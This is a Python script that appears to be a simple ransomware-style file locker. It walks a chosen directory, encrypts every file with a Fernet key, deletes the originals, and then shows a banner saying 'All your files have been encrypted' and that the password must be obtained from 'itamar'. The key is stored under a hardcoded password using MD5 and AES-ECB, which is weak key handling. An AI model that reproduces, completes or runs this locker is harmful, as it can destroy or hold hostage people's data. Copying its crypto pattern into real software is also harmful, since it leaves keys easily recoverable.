import os
import subprocess
import sys

# Ensure required libraries are installed, and install them if missing
def install_required_libraries():
    required_libraries = {
        "cryptography": "cryptography",
        "pycryptodome": "pycryptodome"
    }
    
    for library, package_name in required_libraries.items():
        try:
            __import__(library)
        except ImportError:
            print(f"Required library '{package_name}' not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

install_required_libraries()

# Import necessary libraries after installation
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import hashlib
import getpass

# Clear the screen based on the operating system
def clear_screen():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

# Print a message in green with a border
def print_large_message_in_green(message):
    border = '*' * (len(message) + 4)
    green_color_code = "\033[92m"
    reset_color_code = "\033[0m"
    
    print(f"{green_color_code}{border}{reset_color_code}")
    print(f"{green_color_code}* {message} *{reset_color_code}")
    print(f"{green_color_code}{border}{reset_color_code}")

# Generate a new Fernet key for encryption/decryption
def generate_key():
    return Fernet.generate_key()

# Encrypt a specific file using a Fernet key
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)

        encrypted_file_path = file_path + '.encrypted'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted_data)
        os.remove(file_path)
        print(f"Encrypted {file_path}")
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

# Decrypt a specific file using a Fernet key
def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()

        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)

        original_file_path = file_path.replace('.encrypted', '')
        with open(original_file_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_data)
        os.remove(file_path)
        print(f"Decrypted {file_path}")
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# Encrypt all files in the specified directory, excluding the script itself and .key files
def encrypt_directory(directory, key):
    try:
        script_name = os.path.basename(__file__)
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file != script_name and not file.endswith('.key'):
                    encrypt_file(file_path, key)
    except Exception as e:
        print(f"Error encrypting directory {directory}: {e}")

# Decrypt all files ending with .encrypted in the specified directory
def decrypt_directory(directory, key):
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith('.encrypted'):
                    decrypt_file(file_path, key)
    except Exception as e:
        print(f"Error decrypting directory {directory}: {e}")

# Save the encrypted Fernet key using a custom password
def save_encrypted_key(key):
    custom_password = "itamar"  # Change this to a memorable password of your choice

    custom_key = hashlib.md5(custom_password.encode()).digest()  # Create an AES key using the MD5 hash of the password
    cipher = AES.new(custom_key, AES.MODE_ECB)
    encrypted_key = cipher.encrypt(pad(key, AES.block_size))
    with open('key.txt', 'wb') as key_file:
        key_file.write(encrypted_key)

# Create a script that allows users to reveal the Fernet key with the correct password
def create_show_key_script():
    show_key_script = """
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import getpass

def decrypt_key():
    custom_password = "itamar"  # Change this to match the password used in save_encrypted_key
    custom_key = hashlib.md5(custom_password.encode()).digest()
    cipher = AES.new(custom_key, AES.MODE_ECB)

    try:
        with open('key.txt', 'rb') as key_file:
            encrypted_key = key_file.read()

        user_password = getpass.getpass("Enter the decryption password: ").encode()
        user_key = hashlib.md5(user_password).digest()

        if user_key == custom_key:
            key = unpad(cipher.decrypt(encrypted_key), AES.block_size)
            print("Decrypted key:")
            print(key.decode())
        else:
            print("Wrong password!")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    decrypt_key()
"""
    with open('show_key.py', 'w') as script_file:
        script_file.write(show_key_script)
    clear_screen()
    print("A script has been created to reveal the key if you have the password.")

# Remove temporary files created during encryption
def remove_temp_files():
    if os.path.exists('key.txt'):
        os.remove('key.txt')
    if os.path.exists('show_key.py'):
        os.remove('show_key.py')

# Encrypt files in the specified directory, save the encryption key, create a script to show the key, and prompt the user to continue
def encryption_interface():
    try:
        directory = input("Enter the path of the directory to encrypt (or type 'here' to use the current directory): ").strip()
        
        if directory == 'here':
            directory = os.getcwd()

        if not os.path.isdir(directory):
            print("Invalid directory path")
            return

        key = generate_key()
        encrypt_directory(directory, key)
        
        save_encrypted_key(key)
        create_show_key_script()
        input("Press Enter to continue...")

        clear_screen()
        print_large_message_in_green("All your files have been encrypted... \naccess itamar to get the password to decrypt!!")

    except Exception as e:
        print(f"An error occurred during encryption: {e}")

# Decrypt files in the specified directory using the provided key, clear the screen, and remove temporary files
def decryption_interface():
    try:
        directory = input("Enter the path of the directory to decrypt (or type 'here' to use the current directory): ").strip()
        
        if directory == 'here':
            directory = os.getcwd()

        if not os.path.isdir(directory):
            print("Invalid directory path")
            return

        key = input("Enter the original encryption key: ").strip().encode()

        decrypt_directory(directory, key)
        clear_screen()
        print_large_message_in_green("All files have been successfully recovered.")

        remove_temp_files()

    except Exception as e:
        print(f"An error occurred during decryption: {e}")

# Main function to prompt the user to encrypt or decrypt files
def main():
    action = input("Would you like to encrypt or decrypt the files? (e/d): ").strip().lower()

    if action == 'e':
        encryption_interface()
    elif action == 'd':
        decryption_interface()
    else:
        print("Invalid action. Please choose either 'e' or 'd'.")

if __name__ == "__main__":
    main()
